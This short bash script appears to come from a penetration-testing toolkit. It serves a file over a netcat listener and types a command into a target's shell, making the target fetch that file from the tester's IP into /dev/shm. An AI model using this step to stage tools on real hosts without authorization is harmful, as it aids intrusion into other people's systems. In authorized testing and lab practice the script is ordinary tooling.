#!/bin/bash

# Upload a file via nc
# Original by [JohnHammond](https://github.com/JohnHammond/poor-mans-pentest)

source "$HOME/.local/bin/functions"

PORT=$(($RANDOM+3000))
filename=$(basename $1)

hide_guake
nc -q 0 -lnvp $PORT < $1 &
command "nc $IP $PORT > /dev/shm/$filename"
